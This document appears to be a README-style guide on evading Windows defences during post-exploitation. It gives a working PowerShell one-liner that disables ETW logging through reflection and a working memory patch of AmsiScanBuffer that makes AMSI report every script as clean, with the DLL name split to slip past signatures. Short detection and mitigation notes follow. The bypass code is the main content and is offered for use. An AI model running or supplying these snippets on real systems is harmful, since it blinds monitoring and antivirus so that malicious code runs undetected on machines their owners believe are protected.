# ETW-AMSI-Evasion

## 🔹 Overview

Modern Windows systems include built-in defensive mechanisms that help detect malicious activity:

* **ETW (Event Tracing for Windows)** → logging & telemetry
* **AMSI (Antimalware Scan Interface)** → content scanning

Attackers often attempt to **bypass or disable these protections** to evade detection during post-exploitation.

---

# 🔹 Event Tracing for Windows (ETW)

## 🔸 What is ETW?

**ETW (Event Tracing for Windows)** is a high-performance logging system built into Windows.

### 🔹 Key Functions:

* Logs system and application events
* Provides telemetry for:

  * Security tools (EDR, SIEM)
  * Debugging and diagnostics
* Collects data from:

  * Kernel
  * User-mode processes
  * Services and drivers

---

## 🔸 Why Attackers Target ETW

Security tools rely heavily on ETW for:

* PowerShell logging
* Process activity tracking
* Behavioral detection

➡️ Disabling ETW can **blind defenders** to attacker activity.

---

## 🔸 ETW Bypass (PowerShell)

> Disables ETW logging for PowerShell by modifying internal .NET fields.

```powershell id="etw_bypass_1"
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

🔹 Effect:

* Disables ETW logging in the current process
* Reduces visibility for defenders

---

# 🔹 Antimalware Scan Interface (AMSI)

## 🔸 What is AMSI?

**AMSI (Antimalware Scan Interface)** is a Windows API that allows applications to send content to antivirus engines for scanning.

### 🔹 Key Features:

* Integrated into:

  * PowerShell
  * Windows Script Host
  * Office macros
* Scans:

  * Scripts
  * In-memory content
  * Command execution

### 🔹 Common Providers:

* Windows Defender
* Third-party antivirus solutions

---

## 🔸 Why Attackers Target AMSI

AMSI inspects scripts **before execution**, making it very effective at detecting:

* Obfuscated PowerShell
* Known malicious payloads
* Fileless attacks

➡️ Bypassing AMSI allows execution of malicious code **without AV detection**

---

## 🔸 AMSI Bypass (Memory Patching)

> Patches the `AmsiScanBuffer` function in memory to disable scanning.

```powershell id="amsi_bypass_1"
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)

$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

---

## 🔸 How This Works

* Loads `amsi.dll`
* Locates `AmsiScanBuffer`
* Changes memory permissions (RWX)
* Overwrites function with a patch that forces a clean result

🔹 Result:

* AMSI always returns **“clean”**
* Malicious scripts bypass antivirus scanning

---

# 🔹 ETW vs AMSI

| Feature     | ETW                 | AMSI              |
| ----------- | ------------------- | ----------------- |
| Purpose     | Logging & telemetry | Malware scanning  |
| Scope       | System-wide         | Application-level |
| Used by     | EDR, SIEM           | Antivirus engines |
| Attack Goal | Blind monitoring    | Bypass detection  |

---

# 🔹 Detection & Defense (Blue Team Insight)

## 🔸 ETW Bypass Indicators:

* PowerShell reflection usage
* Access to internal .NET fields
* Sudden drop in logging visibility

## 🔸 AMSI Bypass Indicators:

* `LoadLibrary("amsi.dll")`
* `GetProcAddress("AmsiScanBuffer")`
* Memory patching (VirtualProtect)

---

# 🔹 Mitigations

* Enable:

  * Script Block Logging
  * PowerShell Transcription
* Monitor:

  * Suspicious PowerShell activity
  * In-memory patching behavior
* Use:

  * EDR solutions with behavioral detection
  * AMSI-integrated security tools

---

# 🔹 Key Takeaways

* ETW and AMSI are critical Windows security components
* ETW → visibility | AMSI → prevention
* Bypassing both significantly reduces detection
* Modern defenses rely on **behavioral detection**, not just signatures

---
